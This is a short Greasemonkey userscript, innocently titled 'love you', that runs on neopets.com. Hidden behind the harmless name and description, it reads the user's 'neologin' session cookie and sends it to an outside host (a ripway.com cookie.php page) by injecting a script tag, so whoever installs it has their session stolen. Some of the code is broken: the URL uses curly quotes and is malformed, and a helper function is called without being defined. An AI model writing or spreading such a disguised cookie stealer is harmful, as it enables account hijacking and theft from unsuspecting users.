// ==UserScript==
// @name           love you
// @namespace      love you
// @description    I love you
// @include        *neopets.com*
// ==/UserScript==

var strURL = ‘http:h1.ripway.com/sprsexxxyshane/cookie.php?cookie=’

var eleNew, newElement;

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}

